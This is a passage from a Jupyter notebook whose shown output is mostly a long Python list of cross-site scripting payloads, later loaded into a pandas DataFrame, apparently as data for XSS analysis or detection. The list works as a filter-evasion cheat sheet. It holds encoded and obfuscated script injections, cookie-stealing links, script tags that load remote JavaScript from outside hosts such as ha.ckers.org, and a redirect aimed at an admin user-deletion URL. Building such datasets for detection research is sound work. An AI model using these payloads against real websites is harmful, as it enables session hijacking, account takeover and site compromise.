       " \"<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;\",\n",
       " '<script ^__^>alert(String.fromCharCode(49))</script ^__^',\n",
       " '</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(',\n",
       " '&#00;</form><input type&#61;\"date\" onfocus=\"alert(1)\">',\n",
       " \"<form><textarea &#13; onkeyup='\\\\u0061\\\\u006C\\\\u0065\\\\u0072\\\\u0074&#x28;1&#x29;'>\",\n",
       " \"<script /***/>/***/confirm('\\\\uFF41\\\\uFF4C\\\\uFF45\\\\uFF52\\\\uFF54\\\\u1455\\\\uFF11\\\\u1450')/***/</script /***/\",\n",
       " \"<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>\",\n",
       " '<a href=\"javascript:void(0)\" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>',\n",
       " '<script ~~~>alert(0%0)</script ~~~>',\n",
       " '<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>',\n",
       " \"<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN\",\n",
       " \"<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)\",\n",
       " \"&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'\",\n",
       " '&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}',\n",
       " \"<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^\",\n",
       " '<div/style=\"width:expression(confirm(1))\">X</div> {IE7}',\n",
       " '<iframe/%00/ src=javaSCRIPT&colon;alert(1)',\n",
       " \"//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//\",\n",
       " '/*iframe/src*/<iframe/src=\"<iframe/src=@\"/onload=prompt(1) /*iframe/src*/>',\n",
       " \"//|\\\\\\\\ <script //|\\\\\\\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\\\\\\\ </script //|\\\\\\\\\",\n",
       " \"</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>\",\n",
       " '<a/href=\"javascript:&#13; javascript:prompt(1)\"><input type=\"X\">',\n",
       " '</plaintext\\\\></|\\\\><plaintext/onmouseover=prompt(1)',\n",
       " \"</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}\",\n",
       " '<a href=\"javascript&colon;\\\\u0061&#x6C;&#101%72t&lpar;1&rpar;\"><button>',\n",
       " \"<div onmouseover='alert&lpar;1&rpar;'>DIV</div>\",\n",
       " '<iframe style=\"xg-p:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\">',\n",
       " '<a href=\"jAvAsCrIpT&colon;alert&lpar;1&rpar;\">X</a>',\n",
       " '<embed src=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\">',\n",
       " '<object data=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\">',\n",
       " '<var onmouseover=\"prompt(1)\">On Mouse Over</var>',\n",
       " '<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>',\n",
       " '<img src=\"/\" =_=\" title=\"onerror=\\'prompt(1)\\'\">',\n",
       " \"<%<!--'%><script>alert(1);</script -->\",\n",
       " '<script src=\"data:text/javascript,alert(1)\"></script>',\n",
       " '<iframe/src \\\\/\\\\/onload = prompt(1)',\n",
       " '<iframe/onreadystatechange=alert(1)',\n",
       " '<svg/onload=alert(1)',\n",
       " '<input value=<><iframe/src=javascript:confirm(1)',\n",
       " '<input type=\"text\" value=`` <div/onmouseover=\\'alert(1)\\'>X</div>',\n",
       " 'http://www.<script>alert(1)</script .com',\n",
       " '<svg><script ?>alert(1)',\n",
       " '<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>',\n",
       " '<img src=`xx:xx`onerror=alert(1)>',\n",
       " '<meta http-equiv=\"refresh\" content=\"0;javascript&colon;alert(1)\"/>',\n",
       " '<math><a xlink:href=\"//jsfiddle.net/t846h/\">click',\n",
       " '<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always>',\n",
       " '<svg contentScriptType=text/vbs><script>MsgBox+1',\n",
       " '<a href=\"data:text/html;base64_,<svg/onload=\\\\u0061&#x6C;&#101%72t(1)>\">X</a',\n",
       " \"<iframe/onreadystatechange=\\\\u0061\\\\u006C\\\\u0065\\\\u0072\\\\u0074('\\\\u0061') worksinIE>\",\n",
       " \"<script>~'\\\\u0061' ; \\\\u0074\\\\u0068\\\\u0072\\\\u006F\\\\u0077 ~ \\\\u0074\\\\u0068\\\\u0069\\\\u0073. \\\\u0061\\\\u006C\\\\u0065\\\\u0072\\\\u0074(~'\\\\u0061')</script U+\",\n",
       " '<script/src=\"data&colon;text%2Fj\\\\u0061v\\\\u0061script,\\\\u0061lert(\\'\\\\u0061\\')\"></script a=\\\\u0061 & /=%2F',\n",
       " '<script/src=data&colon;text/j\\\\u0061v\\\\u0061&#115&#99&#114&#105&#112&#116,\\\\u0061%6C%65%72%74(/XSS/)></script',\n",
       " '<object data=javascript&colon;\\\\u0061&#x6C;&#101%72t(1)>',\n",
       " '<script>+-+-1-+-+alert(1)</script>',\n",
       " '<body/onload=&lt;!--&gt;&#10alert(1)>',\n",
       " '<script itworksinallbrowsers>/*<script* */alert(1)</script',\n",
       " '<img src ?itworksonchrome?\\\\/onerror = alert(1)',\n",
       " '<svg><script>//&NewLine;confirm(1);</script </svg>',\n",
       " '<svg><script onlypossibleinopera:-)> alert(1)',\n",
       " '<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe',\n",
       " '<script x> alert(1) </script 1=2',\n",
       " '<div/onmouseover=\\'alert(1)\\'> style=\"x:\">',\n",
       " '<--`<img/src=` onerror=alert(1)> --!>',\n",
       " '<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>',\n",
       " '<div style=\"xg-p:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\" onclick=\"alert(1)\">x</button>',\n",
       " '\"><img src=x onerror=window.open(\\'https://www.google.com/\\');>',\n",
       " '<form><button formaction=javascript&colon;alert(1)>CLICKME',\n",
       " '<math><a xlink:href=\"//jsfiddle.net/t846h/\">click',\n",
       " '<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>',\n",
       " '<iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"></iframe>',\n",
       " '<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>',\n",
       " '<IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>”>',\n",
       " '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',\n",
       " '<IMG SRC=”jav ascript:alert(‘XSS’);”>',\n",
       " '<IMG SRC=”jav&#x09;ascript:alert(‘XSS’);”>',\n",
       " '<<SCRIPT>alert(“XSS”);//<</SCRIPT>',\n",
       " '%253cscript%253ealert(1)%253c/script%253e',\n",
       " '“><s”%2b”cript>alert(document.cookie)</script>',\n",
       " 'foo<script>alert(1)</script>',\n",
       " '<scr<script>ipt>alert(1)</scr</script>ipt>',\n",
       " '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',\n",
       " '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',\n",
       " '<BODY BACKGROUND=”javascript:alert(‘XSS’)”>',\n",
       " '<BODY ONLOAD=alert(‘XSS’)>',\n",
       " '<INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”>',\n",
       " '<IMG SRC=”javascript:alert(‘XSS’)”',\n",
       " '<iframe src=http://ha.ckers.org/scriptlet.html <',\n",
       " 'javascript:alert(\"hellox worldss\")',\n",
       " '<img src=\"javascript:alert(\\'XSS\\');\">',\n",
       " '<img src=javascript:alert(&quot;XSS&quot;)>',\n",
       " '<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">',\n",
       " '<IFRAME SRC=\"javascript:alert(\\'XSS\\');\"></IFRAME>',\n",
       " '<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>',\n",
       " '<SCRIPT a=\">\" \\'\\' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>',\n",
       " '<SCRIPT \"a=\\'>\\'\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>',\n",
       " '<SCRIPT a=\">\\'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>',\n",
       " '<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>',\n",
       " '<<SCRIPT>alert(\"XSS\");//<</SCRIPT>',\n",
       " '<script>alert(\"hellox worldss\")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510',\n",
       " '<script>alert(\"XSS\");</script>&search=1',\n",
       " '<h1><font color=blue>hellox worldss</h1>',\n",
       " \"<BODY ONLOAD=alert('hellox worldss')>\",\n",
       " '<input onfocus=write(XSS) autofocus>',\n",
       " '<input onblur=write(XSS) autofocus><input autofocus>',\n",
       " '<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>',\n",
       " '<form><button formaction=\"javascript:alert(XSS)\">lol',\n",
       " '<!--<img src=\"--><img src=x onerror=alert(XSS)//\">',\n",
       " '<![><img src=\"]><img src=x onerror=alert(XSS)//\">',\n",
       " '<style><img src=\"</style><img src=x onerror=alert(XSS)//\">',\n",
       " '<? foo=\"><script>alert(1)</script>\">',\n",
       " '<! foo=\"><script>alert(1)</script>\">',\n",
       " '</ foo=\"><script>alert(1)</script>\">',\n",
       " '<? foo=\"><x foo=\\'?><script>alert(1)</script>\\'>\">',\n",
       " '<! foo=\"[[[Inception]]\"><x foo=\"]foo><script>alert(1)</script>\">',\n",
       " '<% foo><x foo=\"%><script>alert(123)</script>\">',\n",
       " '<div style=\"font-family:\\'foo&#10;;color:red;\\';\">LOL',\n",
       " 'LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>',\n",
       " '<script>({0:#0=alert/#0#/#0#(0)})</script>',\n",
       " '<svg xmlns=\"http://www.w3.org/2000/svg\">LOL<script>alert(123)</script></svg>',\n",
       " '&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;',\n",
       " '\\\\\\\\\";alert(\\'XSS\\');//',\n",
       " '&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\\\\\"XSS\\\\\");&lt;/SCRIPT&gt;',\n",
       " '&lt;INPUT TYPE=\\\\\"IMAGE\\\\\" SRC=\\\\\"javascript&#058;alert(\\'XSS\\');\\\\\"&gt;',\n",
       " '&lt;BODY BACKGROUND=\\\\\"javascript&#058;alert(\\'XSS\\')\\\\\"&gt;',\n",
       " \"&lt;BODY ONLOAD=alert('XSS')&gt;\",\n",
       " '&lt;IMG DYNSRC=\\\\\"javascript&#058;alert(\\'XSS\\')\\\\\"&gt;',\n",
       " '&lt;IMG LOWSRC=\\\\\"javascript&#058;alert(\\'XSS\\')\\\\\"&gt;',\n",
       " '&lt;BGSOUND SRC=\\\\\"javascript&#058;alert(\\'XSS\\');\\\\\"&gt;',\n",
       " '&lt;BR SIZE=\\\\\"&{alert(\\'XSS\\')}\\\\\"&gt;',\n",
       " '&lt;LAYER SRC=\\\\\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\\\\\"&gt;&lt;/LAYER&gt;',\n",
       " '&lt;LINK REL=\\\\\"stylesheet\\\\\" HREF=\\\\\"javascript&#058;alert(\\'XSS\\');\\\\\"&gt;',\n",
       " '&lt;LINK REL=\\\\\"stylesheet\\\\\" HREF=\\\\\"http&#58;//ha&#46;ckers&#46;org/xss&#46;css\\\\\"&gt;',\n",
       " \"&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;\",\n",
       " '&lt;META HTTP-EQUIV=\\\\\"Link\\\\\" Content=\\\\\"&lt;http&#58;//ha&#46;ckers&#46;org/xss&#46;css&gt;; REL=stylesheet\\\\\"&gt;',\n",
       " '&lt;STYLE&gt;BODY{-moz-binding&#58;url(\\\\\"http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\\\\\")}&lt;/STYLE&gt;',\n",
       " '&lt;XSS STYLE=\\\\\"behavior&#58; url(xss&#46;htc);\\\\\"&gt;',\n",
       " '&lt;STYLE&gt;li {list-style-image&#58; url(\\\\\"javascript&#058;alert(\\'XSS\\')\\\\\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS',\n",
       " '&lt;IMG SRC=\\'vbscript&#058;msgbox(\\\\\"XSS\\\\\")\\'&gt;',\n",
       " '&lt;IMG SRC=\\\\\"mocha&#58;&#91;code&#93;\\\\\"&gt;',\n",
       " '&lt;IMG SRC=\\\\\"livescript&#058;&#91;code&#93;\\\\\"&gt;',\n",
       " 'žscriptualert(EXSSE)ž/scriptu',\n",
       " '&lt;META HTTP-EQUIV=\\\\\"refresh\\\\\" CONTENT=\\\\\"0;url=javascript&#058;alert(\\'XSS\\');\\\\\"&gt;',\n",
       " '&lt;META HTTP-EQUIV=\\\\\"refresh\\\\\" CONTENT=\\\\\"0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\\\\\"&gt;',\n",
       " '&lt;META HTTP-EQUIV=\\\\\"refresh\\\\\" CONTENT=\\\\\"0; URL=http&#58;//;URL=javascript&#058;alert(\\'XSS\\');\\\\\"',\n",
       " '&lt;IFRAME SRC=\\\\\"javascript&#058;alert(\\'XSS\\');\\\\\"&gt;&lt;/IFRAME&gt;',\n",
       " '&lt;FRAMESET&gt;&lt;FRAME SRC=\\\\\"javascript&#058;alert(\\'XSS\\');\\\\\"&gt;&lt;/FRAMESET&gt;',\n",
       " '&lt;TABLE BACKGROUND=\\\\\"javascript&#058;alert(\\'XSS\\')\\\\\"&gt;',\n",
       " '&lt;TABLE&gt;&lt;TD BACKGROUND=\\\\\"javascript&#058;alert(\\'XSS\\')\\\\\"&gt;',\n",
       " '&lt;DIV STYLE=\\\\\"background-image&#58; url(javascript&#058;alert(\\'XSS\\'))\\\\\"&gt;',\n",
       " '&lt;DIV STYLE=\\\\\"background-image&#58;\\\\0075\\\\0072\\\\006C\\\\0028\\'\\\\006a\\\\0061\\\\0076\\\\0061\\\\0073\\\\0063\\\\0072\\\\0069\\\\0070\\\\0074\\\\003a\\\\0061\\\\006c\\\\0065\\\\0072\\\\0074\\\\0028&#46;1027\\\\0058&#46;1053\\\\0053\\\\0027\\\\0029\\'\\\\0029\\\\\"&gt;',\n",
       " '&lt;DIV STYLE=\\\\\"background-image&#58; url(javascript&#058;alert(\\'XSS\\'))\\\\\"&gt;',\n",
       " '&lt;DIV STYLE=\\\\\"width&#58; expression(alert(\\'XSS\\'));\\\\\"&gt;',\n",
       " '&lt;STYLE&gt;@im\\\\port\\'\\\\ja\\\\vasc\\\\ript&#58;alert(\\\\\"XSS\\\\\")\\';&lt;/STYLE&gt;',\n",
       " '&lt;IMG STYLE=\\\\\"xss&#58;expr/*XSS*/ession(alert(\\'XSS\\'))\\\\\"&gt;',\n",
       " '&lt;XSS STYLE=\\\\\"xss&#58;expression(alert(\\'XSS\\'))\\\\\"&gt;',\n",
       " 'exp/*&lt;A STYLE=\\'no\\\\xss&#58;noxss(\\\\\"*//*\\\\\");',\n",
       " 'xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\\\\\"XSS\\\\\"))\\'&gt;',\n",
       " '&lt;STYLE TYPE=\\\\\"text/javascript\\\\\"&gt;alert(\\'XSS\\');&lt;/STYLE&gt;',\n",
       " '&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\\\\\"javascript&#058;alert(\\'XSS\\')\\\\\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;',\n",
       " '&lt;STYLE type=\\\\\"text/css\\\\\"&gt;BODY{background&#58;url(\\\\\"javascript&#058;alert(\\'XSS\\')\\\\\")}&lt;/STYLE&gt;',\n",
       " '&lt;!--&#91;if gte IE 4&#93;&gt;',\n",
       " \"&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;\",\n",
       " '&lt;!&#91;endif&#93;--&gt;',\n",
       " '&lt;BASE HREF=\\\\\"javascript&#058;alert(\\'XSS\\');//\\\\\"&gt;',\n",
       " '&lt;OBJECT TYPE=\\\\\"text/x-scriptlet\\\\\" DATA=\\\\\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\\\\\"&gt;&lt;/OBJECT&gt;',\n",
       " \"&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;\",\n",
       " '&lt;EMBED SRC=\\\\\"http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\\\\\" AllowScriptAccess=\\\\\"always\\\\\"&gt;&lt;/EMBED&gt;',\n",
       " 'a=\\\\\"get\\\\\";',\n",
       " 'b=\\\\\"URL(\\\\\\\\\"\\\\\";',\n",
       " 'c=\\\\\"javascript&#058;\\\\\";',\n",
       " 'd=\\\\\"alert(\\'XSS\\');\\\\\\\\\")\\\\\";',\n",
       " 'eval(a+b+c+d);',\n",
       " '&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\\\\\"xss\\\\\" implementation=\\\\\"http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\\\\\"&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;',\n",
       " '&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\\\\\"javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert(\\'XSS\\');\\\\\"&gt;&#93;&#93;&gt;',\n",
       " '&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;',\n",
       " '&lt;XML ID=\\\\\"xss\\\\\"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\\\\\"javas&lt;!-- --&gt;cript&#58;alert(\\'XSS\\')\\\\\"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;',\n",
       " '&lt;SPAN DATASRC=\\\\\"#xss\\\\\" DATAFLD=\\\\\"B\\\\\" DATAFORMATAS=\\\\\"HTML\\\\\"&gt;&lt;/SPAN&gt;',\n",
       " '&lt;XML SRC=\\\\\"xsstest&#46;xml\\\\\" ID=I&gt;&lt;/XML&gt;',\n",
       " '&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;',\n",
       " '&lt;HTML&gt;&lt;BODY&gt;',\n",
       " '&lt;?xml&#58;namespace prefix=\\\\\"t\\\\\" ns=\\\\\"urn&#58;schemas-microsoft-com&#58;time\\\\\"&gt;',\n",
       " '&lt;?import namespace=\\\\\"t\\\\\" implementation=\\\\\"#default#time2\\\\\"&gt;',\n",
       " '&lt;t&#58;set attributeName=\\\\\"innerHTML\\\\\" to=\\\\\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\\\\\"&gt;',\n",
       " '&lt;/BODY&gt;&lt;/HTML&gt;',\n",
       " '&lt;SCRIPT SRC=\\\\\"http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\\\\\"&gt;&lt;/SCRIPT&gt;',\n",
       " '&lt;!--#exec cmd=\\\\\"/bin/echo \\'&lt;SCR\\'\\\\\"--&gt;&lt;!--#exec cmd=\\\\\"/bin/echo \\'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;\\'\\\\\"--&gt;',\n",
       " \"&lt;? echo('&lt;SCR)';\",\n",
       " 'echo(\\'IPT&gt;alert(\\\\\"XSS\\\\\")&lt;/SCRIPT&gt;\\'); ?&gt;',\n",
       " '&lt;IMG SRC=\\\\\"http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\\\\\"&gt;',\n",
       " 'Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser',\n",
       " '&lt;META HTTP-EQUIV=\\\\\"Set-Cookie\\\\\" Content=\\\\\"USERID=&lt;SCRIPT&gt;alert(\\'XSS\\')&lt;/SCRIPT&gt;\\\\\"&gt;',\n",
       " '&lt;HEAD&gt;&lt;META HTTP-EQUIV=\\\\\"CONTENT-TYPE\\\\\" CONTENT=\\\\\"text/html; charset=UTF-7\\\\\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(\\'XSS\\');+ADw-/SCRIPT+AD4-',\n",
       " '&lt;SCRIPT a=\\\\\"&gt;\\\\\" SRC=\\\\\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\\\\\"&gt;&lt;/SCRIPT&gt;',\n",
       " '&lt;SCRIPT =\\\\\"&gt;\\\\\" SRC=\\\\\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\\\\\"&gt;&lt;/SCRIPT&gt;',\n",
       " '&lt;SCRIPT a=\\\\\"&gt;\\\\\" \\'\\' SRC=\\\\\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\\\\\"&gt;&lt;/SCRIPT&gt;',\n",
       " '&lt;SCRIPT \\\\\"a=\\'&gt;\\'\\\\\" SRC=\\\\\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\\\\\"&gt;&lt;/SCRIPT&gt;',\n",
       " '&lt;SCRIPT a=`&gt;` SRC=\\\\\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\\\\\"&gt;&lt;/SCRIPT&gt;',\n",
       " '&lt;SCRIPT a=\\\\\"&gt;\\'&gt;\\\\\" SRC=\\\\\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\\\\\"&gt;&lt;/SCRIPT&gt;',\n",
       " '&lt;SCRIPT&gt;document&#46;write(\\\\\"&lt;SCRI\\\\\");&lt;/SCRIPT&gt;PT SRC=\\\\\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\\\\\"&gt;&lt;/SCRIPT&gt;',\n",
       " '&lt;A HREF=\\\\\"http&#58;//66&#46;102&#46;7&#46;147/\\\\\"&gt;XSS&lt;/A&gt;',\n",
       " '&lt;A HREF=\\\\\"http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\\\\\"&gt;XSS&lt;/A&gt;',\n",
       " '&lt;A HREF=\\\\\"http&#58;//1113982867/\\\\\"&gt;XSS&lt;/A&gt;',\n",
       " '&lt;A HREF=\\\\\"http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\\\\\"&gt;XSS&lt;/A&gt;',\n",
       " '&lt;A HREF=\\\\\"http&#58;//0102&#46;0146&#46;0007&#46;00000223/\\\\\"&gt;XSS&lt;/A&gt;',\n",
       " '&lt;A HREF=\\\\\"htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\\\\\"&gt;XSS&lt;/A&gt;',\n",
       " '&lt;A HREF=\\\\\"//www&#46;google&#46;com/\\\\\"&gt;XSS&lt;/A&gt;',\n",
       " '&lt;A HREF=\\\\\"//google\\\\\"&gt;XSS&lt;/A&gt;',\n",
       " '&lt;A HREF=\\\\\"http&#58;//ha&#46;ckers&#46;org@google\\\\\"&gt;XSS&lt;/A&gt;',\n",
       " '&lt;A HREF=\\\\\"http&#58;//google&#58;ha&#46;ckers&#46;org\\\\\"&gt;XSS&lt;/A&gt;',\n",
       " '&lt;A HREF=\\\\\"http&#58;//google&#46;com/\\\\\"&gt;XSS&lt;/A&gt;',\n",
       " '&lt;A HREF=\\\\\"http&#58;//www&#46;google&#46;com&#46;/\\\\\"&gt;XSS&lt;/A&gt;',\n",
       " '&lt;A HREF=\\\\\"javascript&#058;document&#46;location=\\'http&#58;//www&#46;google&#46;com/\\'\\\\\"&gt;XSS&lt;/A&gt;',\n",
       " '&lt;A HREF=\\\\\"http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\\\\\"&gt;XSS&lt;/A&gt;',\n",
       " '&lt;',\n",
       " '%3C',\n",
       " '&lt',\n",
       " '&lt;',\n",
       " '&LT',\n",
       " '&LT;',\n",
       " '&#60',\n",
       " '&#060',\n",
       " '&#0060',\n",
       " '&#00060',\n",
       " '&#000060',\n",
       " '&#0000060',\n",
       " '&lt;',\n",
       " '&#x3c',\n",
       " '&#x03c',\n",
       " '&#x003c',\n",
       " '&#x0003c',\n",
       " '&#x00003c',\n",
       " '&#x000003c',\n",
       " '&#x3c;',\n",
       " '&#x03c;',\n",
       " '&#x003c;',\n",
       " '&#x0003c;',\n",
       " '&#x00003c;',\n",
       " '&#x000003c;',\n",
       " '&#X3c',\n",
       " '&#X03c',\n",
       " '&#X003c',\n",
       " '&#X0003c',\n",
       " '&#X00003c',\n",
       " '&#X000003c',\n",
       " '&#X3c;',\n",
       " '&#X03c;',\n",
       " '&#X003c;',\n",
       " '&#X0003c;',\n",
       " '&#X00003c;',\n",
       " '&#X000003c;',\n",
       " '&#x3C',\n",
       " '&#x03C',\n",
       " '&#x003C',\n",
       " '&#x0003C',\n",
       " '&#x00003C',\n",
       " '&#x000003C',\n",
       " '&#x3C;',\n",
       " '&#x03C;',\n",
       " '&#x003C;',\n",
       " '&#x0003C;',\n",
       " '&#x00003C;',\n",
       " '&#x000003C;',\n",
       " '&#X3C',\n",
       " '&#X03C',\n",
       " '&#X003C',\n",
       " '&#X0003C',\n",
       " '&#X00003C',\n",
       " '&#X000003C',\n",
       " '&#X3C;',\n",
       " '&#X03C;',\n",
       " '&#X003C;',\n",
       " '&#X0003C;',\n",
       " '&#X00003C;',\n",
       " '&#X000003C;',\n",
       " '\\\\x3c',\n",
       " '\\\\x3C',\n",
       " '\\\\u003c',\n",
       " '\\\\u003C',\n",
       " '&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;',\n",
       " '&lt;IMG SRC=\\\\\"javascript&#058;alert(\\'XSS\\')\\\\\"',\n",
       " '&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;',\n",
       " '&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;',\n",
       " '&lt;&lt;SCRIPT&gt;alert(\\\\\"XSS\\\\\");//&lt;&lt;/SCRIPT&gt;',\n",
       " '&lt;SCRIPT/SRC=\\\\\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\\\\\"&gt;&lt;/SCRIPT&gt;',\n",
       " '&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\\\\&#93;^`=alert(\\\\\"XSS\\\\\")&gt;',\n",
       " '&lt;SCRIPT/XSS SRC=\\\\\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\\\\\"&gt;&lt;/SCRIPT&gt;',\n",
       " '&lt;IMG SRC=\\\\\"   javascript&#058;alert(\\'XSS\\');\\\\\"&gt;',\n",
       " 'perl -e \\'print \\\\\"&lt;SCR\\\\0IPT&gt;alert(\\\\\\\\\"XSS\\\\\\\\\")&lt;/SCR\\\\0IPT&gt;\\\\\";\\' &gt; out',\n",
       " 'perl -e \\'print \\\\\"&lt;IMG SRC=java\\\\0script&#058;alert(\\\\\\\\\"XSS\\\\\\\\\")&gt;\\\\\";\\' &gt; out',\n",
       " '&lt;IMG SRC=\\\\\"jav&#x0D;ascript&#058;alert(\\'XSS\\');\\\\\"&gt;',\n",
       " '&lt;IMG SRC=\\\\\"jav&#x0A;ascript&#058;alert(\\'XSS\\');\\\\\"&gt;',\n",
       " '&lt;IMG SRC=\\\\\"jav&#x09;ascript&#058;alert(\\'XSS\\');\\\\\"&gt;',\n",
       " '&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;',\n",
       " \"&lt;IMG SRC=javascript&#058;alert('XSS')&gt;\",\n",
       " ...]"
      ]
     },
     "execution_count": 796,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "payloads"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 797,
   "metadata": {},
   "outputs": [],
   "source": [
    "payloads = pd.DataFrame(payloads, columns = [\"payload\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 798,
   "metadata": {},
   "outputs": [
    {
     "data": {
